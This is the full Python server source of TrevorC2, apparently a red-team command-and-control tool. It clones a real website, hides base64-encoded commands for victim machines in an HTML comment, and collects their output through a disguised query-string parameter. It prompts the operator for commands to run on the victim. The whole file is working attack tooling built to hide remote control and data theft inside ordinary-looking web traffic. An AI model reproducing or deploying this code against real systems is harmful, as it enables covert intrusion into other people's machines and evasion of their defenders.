#!/usr/bin/env python
#
# TrevorC2 - legitimate looking command and control 
# Written by: Dave Kennedy @HackingDave
# Website: https://www.trustedsec.com
# GIT: https://github.com/trustedsec
#
# This is the server side which will clone a website of your choosing. Once
# the site is cloned, it'll place information inside the source of the html 
# to be decoded by the client and executed and then passed back to the server
# via a query string parameter. 

# CONFIG OPTIONS
user_agent = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")

# THIS IS WHAT PATH WE WANT TO HIT FOR CODE
root_path_query = ("/")

# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
site_path_query = ("/images")

# THIS IS THE QUERY STRING PARAMETER USED
query_string = ("guid=")

# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
stub = ("oldcss=")

import subprocess
import os
import sys
import BaseHTTPServer,SimpleHTTPServer,cgi
from SocketServer import BaseServer
from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
import urlparse
import base64
import thread
import time
import re

# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)

# our clone site function to get the site we want
def clone_site(user_agent, url):
    # remove old site
    if os.path.isdir("clone_site/"): subprocess.Popen("rm -rf clone_site/", shell=True).wait()
    os.makedirs("clone_site/")

    # run our wget
    print("[*] Cloning website: " + url)
    subprocess.Popen('cd clone_site/;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (user_agent, url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # report success
    if os.path.isfile("clone_site/index.html"): 
        print("[*] Site cloned successfully.")

    # report failure
    check_index = file("clone_site/index.html", "r").read()
    # if the site is blank then cleanup and didn't clone right
    if len(check_index) < 1:
        print("[!] Unable to clone the site. Check internet connection, or do a different site.")
        print("[!] Exiting TrevorC2...")
        if os.path.isdir("clone_site/"): subprocess.Popen("rm -rf clone_site/", shell=True).wait()
        sys.exit()

# Handler for handling GET requests
class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    # hide all of the HTTP requests so we don't get spammed
    def log_message(self, format, *args):
        return

    # handle basic GET requests
    def do_GET(self):
        try:
            # import proper style css files here
            parsed_path = urlparse.urlparse(self.path)
            path = parsed_path.path
            query = parsed_path.query

            if path == root_path_query:
                self.send_response(200)
                self.send_header('Content_type', 'text/html')
                self.end_headers()
                site_data = file("clone_site/index.html", "r").read()
                instructions = file("clone_site/instructions.txt", "r").read()
                site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (stub,instructions))
                self.wfile.write(site_data)

            # this will handle if a user wants to receive emails
            if path == site_path_query:
                query = query.replace(query_string, "")
                # urldecode and remove html encoded stuff
                query=urldecode(query)
                query = query.replace("+", " ")
                self.send_response(200)
                self.send_header('Content_type', 'text/html')
                self.end_headers()
                query = base64.b64decode(query)
                # print our decoded command
                filewrite = file("clone_site/received.txt", "w")
                filewrite.write(query)
                filewrite.close()

                # reset so client doesn't execute command again
                filewrite = file("clone_site/instructions.txt", "w")
                no_instructions = base64.b64encode("nothing")
                filewrite.write(no_instructions)
                filewrite.close()

        # if we had something go wrong
        except Exception, error: print ("[!] Something went wrong, printing error: " + str(error))

# this ultimately handles the http requests and stuff
def main(server_class=BaseHTTPServer.HTTPServer,handler_class=HTTPHandler):
    try:
        server_address = ('', int(80))
        httpd = server_class(server_address, handler_class)
        httpd.serve_forever()

    # handle keyboardinterrupts
    except KeyboardInterrupt:
        print "[!] Exiting the web server...\n"
        sys.exit()

    # handle the rest
    except Exception, error:
        print "[!] Something went wrong, printing error: " + str(error)
        pass

if __name__ == "__main__":

    print(r"""

           ,  .'''''.  ...    ''''',  .'           
            ','     ,.MMMM;.;'      '.             
             ;;    ;MMMMMMMMM;     ;;'             
            :'M:  ;MMMMMMMMMMM;.  :M':             
            : M:  MMMMMMMMMMMMM:  :M  .           
           .' M:  MMMMMMMMMMMMM:  :M. ;           
           ; :M'  :MMMMMMMMMMMM'  'M: :           
           : :M: .;"MMMMMMMMM":;. ,M: :           
           :  ::,MMM;.M":::M.;MMM ::' :           
         ,.;    ;MMMMMM;:MMMMMMMM:    :,.         
         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM         
         M':''':MMMMMMMMM;MMMMMMMM: "': M         
         M.:   ;MMMMMMMMMMMMMMMMMM;   : M         
         :::   MMMMMMMMMMM;MMMMMMMM   ::M         
        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".         
      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.       
     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '     
     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.     
     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:     
     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:     
      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM       
      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:       
       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM       
       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:       
        :M: :    MMMMMMMMM'MMMMMM'   : :MM'       
        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"         
         'M  :    ""''':;;;'''""    :  M:         
         ;'  :     "MMMMMMMM;."     :  "".         
       ,;    :      :MMMMMMM:;.     :    '.       
      :'     :    ,MM'''""''':M:    :     ';       
     ;'      :    ;M'         MM.   :       ;.     
   ,'        :    "            "'   :        '.   
   '        :'                       '        ''   
 .          :                        '          ' 
'          ;                          ;          ' 
          ;                            ' 


                   #TrevorForget

""")
    print("TrevorC2 - Legitimate Website Covert Channel")
    print("Written by: David Kennedy (@HackingDave)")
    print("https://www.trustedsec.com")
    clone_site(user_agent, "https://www.trustedsec.com")
    print("[*] Kicking off web server in thread...")
    thread.start_new_thread(main, ())
    print("[*] Web server started...")

    # here we say no instructions to the client
    filewrite = file("clone_site/instructions.txt", "w")
    no_instructions = base64.b64encode("nothing")
    filewrite.write(no_instructions)
    filewrite.close()

    print("[*] Next, enter the command you want the victim to execute.") 
    print("[*] Client uses random intervals, this may take a few.")
    try:
        while 1:
            task = raw_input("Enter the command to execute on victim: ")
            task = base64.b64encode(task)
            filewrite = file("clone_site/instructions.txt", "w")
            filewrite.write(task)
            filewrite.close()
            print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
            while 1:

                # we received a hit with our command
                if os.path.isfile("clone_site/received.txt"):
                    data = file("clone_site/received.txt").read()
                    print("[*] Received response back from client...")
                    time.sleep(1)
                    print(data)

                    # remove this so we don't use it anymore
                    os.remove("clone_site/received.txt")
                    break
                time.sleep(1)

    # cleanup when using keyboardinterrupt
    except KeyboardInterrupt:
        if os.path.isdir("clone_site/"): subprocess.Popen("rm -rf clone_site/", shell=True)
        print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP.")
        sys.exit()
